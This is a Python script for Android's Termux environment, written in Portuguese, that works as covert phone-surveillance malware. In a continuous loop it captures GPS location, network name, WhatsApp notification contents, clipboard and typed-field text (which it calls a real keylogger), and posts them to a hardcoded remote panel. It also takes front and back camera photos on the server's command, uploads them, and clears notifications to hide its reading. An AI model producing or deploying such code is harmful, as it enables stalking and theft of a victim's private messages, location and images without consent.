import time
import subprocess
import json
import requests
import os
import uuid
import base64
from datetime import datetime

URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
URL_UPLOAD_LOTE = "https://nexos-panel.onrender.com/api/upload_lote"
URL_PING = "https://nexos-panel.onrender.com/"
ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")

def run(cmd, timeout=5):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()
    except:
        return ""

def obter_id():
    if os.path.exists(ARQUIVO_ID):
        with open(ARQUIVO_ID) as f: return f.read().strip()
    novo = f"NX-{str(uuid.uuid4())[:6].upper()}"
    with open(ARQUIVO_ID, "w") as f: f.write(novo)
    return novo

DEVICE_ID = obter_id()

print("\n" + "="*50)
print(f"🛰️  MOTOR NEXOS DUAL STREAM CARD OPERACIONAL")
print(f"🔑  SEU MONITOR ID DE PROD: {DEVICE_ID}")
print("="*50 + "\n")

ultima_lat = -16.6869
ultima_lon = -49.2648
gps_ok = False
inicio = datetime.now()
ultimo_ping = 0
ultimo_whatsapp = 0
ultimo_keylog = 0
historico_msg = {}
msg_processadas = set()  # Evita duplicatas

def obter_rede():
    w = run("termux-wifi-connectioninfo")
    if w:
        try:
            i = json.loads(w)
            s = i.get("ssid","")
            if s and s != "<unknown ssid>": return f"WiFi: {s}"
        except: pass
    return "Dados Moveis"

def obter_gps():
    global ultima_lat, ultima_lon, gps_ok
    out = run("termux-location -p gps -r once", timeout=6)
    if out:
        try:
            d = json.loads(out)
            lat = d.get("latitude")
            lon = d.get("longitude")
            if lat and lon and float(lat) != 0 and float(lon) != 0:
                ultima_lat = float(lat)
                ultima_lon = float(lon)
                gps_ok = True
                return
        except: pass
    gps_ok = False

def obter_app_aberto():
    """Detecta qual app está em primeiro plano"""
    foco = run("dumpsys window | grep mCurrentFocus", timeout=3)
    if foco:
        foco_lower = foco.lower()
        if "whatsapp" in foco_lower: return "whatsapp"
        elif "instagram" in foco_lower: return "instagram"
    return "outro"

def obter_texto_digitado():
    """Captura texto da área de transferência e campo de texto"""
    texto = ""
    
    # Tenta pegar da área de transferência (última coisa copiada/digitada)
    clip = run("termux-clipboard-get", timeout=2)
    if clip and len(clip) > 0:
        texto = clip[:200]
    
    # Tenta pegar do input method (campo de texto ativo)
    input_text = run("dumpsys input_method | grep -A5 'mCur' | grep 'text=' | head -1", timeout=2)
    if input_text and "text=" in input_text:
        try:
            texto = input_text.split("text=")[1].split(",")[0][:200]
        except:
            pass
    
    return texto if texto else None

def obter_whatsapp():
    """Ler notificações e REMOVE duplicatas"""
    global ultimo_whatsapp, historico_msg, msg_processadas
    agora = time.time()
    if agora - ultimo_whatsapp < 8:
        return list(historico_msg.values())
    
    notif = run("termux-notification-list", timeout=5)
    if notif:
        try:
            dados = json.loads(notif)
            novas_msgs = False
            
            for n in dados:
                pkg = n.get("packageName", "")
                if "whatsapp" in pkg.lower():
                    pessoa = n.get("title", "WhatsApp")[:30]
                    texto = n.get("content", "")
                    msg_id = n.get("key", "") or f"{pessoa}_{texto[:50]}_{n.get('when','')}"
                    
                    # PULA se já processou essa mensagem
                    if msg_id in msg_processadas:
                        continue
                    
                    msg_processadas.add(msg_id)
                    novas_msgs = True
                    
                    # Mantém só últimas 500 IDs
                    if len(msg_processadas) > 500:
                        msg_processadas.clear()
                    
                    # Detecta mídia
                    tem_midia = False
                    tipo_midia = ""
                    if any(x in texto.lower() for x in ["📷", "photo", "imagem"]):
                        tem_midia = True; tipo_midia = "📷 Foto"
                    elif any(x in texto.lower() for x in ["🎥", "video", "vídeo"]):
                        tem_midia = True; tipo_midia = "🎥 Vídeo"
                    elif any(x in texto.lower() for x in ["🎵", "audio", "áudio"]):
                        tem_midia = True; tipo_midia = "🎵 Áudio"
                    elif any(x in texto.lower() for x in ["📎", "documento", "arquivo"]):
                        tem_midia = True; tipo_midia = "📎 Arquivo"
                    elif any(x in texto.lower() for x in ["figurinha", "sticker"]):
                        tem_midia = True; tipo_midia = "😄 Figurinha"
                    
                    if tem_midia and not texto:
                        texto = tipo_midia
                    elif tem_midia:
                        texto = f"{tipo_midia}: {texto}"
                    
                    if pessoa not in historico_msg:
                        historico_msg[pessoa] = {
                            "pessoa": pessoa,
                            "mensagens": [],
                            "ultima_msg": "",
                            "total": 0,
                            "midia": False
                        }
                    
                    historico_msg[pessoa]["mensagens"].append({
                        "texto": texto[:150] if texto else "(sem texto)",
                        "midia": tem_midia,
                        "hora": datetime.now().strftime("%H:%M"),
                        "tipo": "recebida"
                    })
                    
                    if len(historico_msg[pessoa]["mensagens"]) > 30:
                        historico_msg[pessoa]["mensagens"] = historico_msg[pessoa]["mensagens"][-30:]
                    
                    historico_msg[pessoa]["ultima_msg"] = texto[:80]
                    historico_msg[pessoa]["total"] = len(historico_msg[pessoa]["mensagens"])
                    historico_msg[pessoa]["midia"] = tem_midia
            
            if novas_msgs:
                # LIMPA notificações depois de processar
                run("termux-notification-remove --all", timeout=3)
            
            ultimo_whatsapp = agora
        except:
            pass
    
    return list(historico_msg.values())

def obter_keylog():
    """Keylogger real - captura texto digitado + app aberto"""
    global ultimo_keylog
    agora = time.time()
    if agora - ultimo_keylog < 3:
        return None
    
    app = obter_app_aberto()
    texto = obter_texto_digitado()
    
    if app in ["whatsapp", "instagram"] or texto:
        ultimo_keylog = agora
        return {
            "app": app,
            "ativo": True,
            "texto": texto or "",
            "timestamp": datetime.now().strftime("%H:%M:%S")
        }
    
    ultimo_keylog = agora
    return None

def executar_comando(acao):
    print(f"   🔧 {acao}")
    if acao == "vibrar": run("termux-vibrate -d 1000", timeout=3)
    elif acao == "som": run("termux-media-player play scan", timeout=3)
    elif acao == "lanterna":
        run("termux-torch on", timeout=3)
        time.sleep(2)
        run("termux-torch off", timeout=3)

def enviar_dados(payload):
    json_str = json.dumps(payload).replace("'", "'\\''")
    cmd = f"curl -s -X POST '{URL_SERVIDOR}' -H 'Content-Type: application/json' -d '{json_str}' --connect-timeout 5 --max-time 5"
    resp = run(cmd, timeout=6)
    try: return json.loads(resp)
    except: return None

def capturar_foto(num, arquivo):
    if os.path.exists(arquivo): os.remove(arquivo)
    try:
        subprocess.run(f"termux-camera-photo -c {num} {arquivo}", shell=True, timeout=6)
        time.sleep(1.5)
        if os.path.exists(arquivo) and os.path.getsize(arquivo) > 100:
            with open(arquivo, "rb") as f: return base64.b64encode(f.read()).decode('utf-8')
    except: pass
    return None

def enviar_lote(front_b64, back_b64):
    if not front_b64 and not back_b64: return False
    try:
        r = requests.post(URL_UPLOAD_LOTE, json={"device_id": DEVICE_ID, "photo_front": front_b64 or "", "photo_back": back_b64 or ""}, timeout=20)
        return r.status_code == 200
    except: return False

print("🛰️  INICIADO v3.1 (Sem duplicatas + Keylogger real)\n")

while True:
    t0 = time.time()
    
    if time.time() - ultimo_ping > 240:
        run(f"curl -s -o /dev/null --connect-timeout 10 --max-time 15 {URL_PING}", timeout=12)
        ultimo_ping = time.time()
    
    bat = "N/A"
    out = run("termux-battery-status")
    if out:
        try: bat = str(json.loads(out).get("percentage", "N/A"))
        except: pass
    
    obter_gps()
    rede = obter_rede()
    msgs_whats = obter_whatsapp()
    keylog = obter_keylog()
    
    payload = {
        "device_id": DEVICE_ID, "battery": bat,
        "uptime": str(datetime.now() - inicio).split('.')[0],
        "lat": ultima_lat, "lon": ultima_lon,
        "network": rede, "whatsapp": msgs_whats, "keylog": keylog
    }
    
    resp = enviar_dados(payload)
    dt = time.time() - t0
    icone = "📍" if gps_ok else "📡"
    
    if resp and resp.get("status") == "success":
        cmd_cam = resp.get("comando_cam", "wait")
        cmd_remoto = resp.get("comando_remoto", "none")
        
        extra = ""
        if keylog and keylog.get("ativo"): extra += f" | ⌨️ {keylog['app']}"
        if msgs_whats: extra += f" | 💬 {len(msgs_whats)} chats"
        
        print(f"{icone} [{datetime.now().strftime('%H:%M:%S')}] Bat:{bat}% {rede}{extra} | {dt:.1f}s")
        
        if keylog and keylog.get("texto"):
            print(f"   ⌨️ Texto: {keylog['texto'][:80]}")
        
        if cmd_remoto != "none": executar_comando(cmd_remoto)
        
        if cmd_cam == "take_dual":
            print("📸 [DUAL] Capturando...")
            arq_tras = os.path.expanduser("~/nexos_back.jpg")
            arq_front = os.path.expanduser("~/nexos_front.jpg")
            b64_tras = capturar_foto(0, arq_tras)
            print(f"   {'✅' if b64_tras else '❌'} Traseira")
            time.sleep(0.3)
            b64_front = capturar_foto(1, arq_front)
            print(f"   {'✅' if b64_front else '❌'} Frontal")
            if b64_tras or b64_front:
                print("   📤 LOTE..." + ("✅" if enviar_lote(b64_front, b64_tras) else "❌"))
            for a in [arq_tras, arq_front]:
                if os.path.exists(a): os.remove(a)
    else:
        print(f"📡 [{datetime.now().strftime('%H:%M:%S')}] Offline | {dt:.1f}s")
    
    time.sleep(2.0)
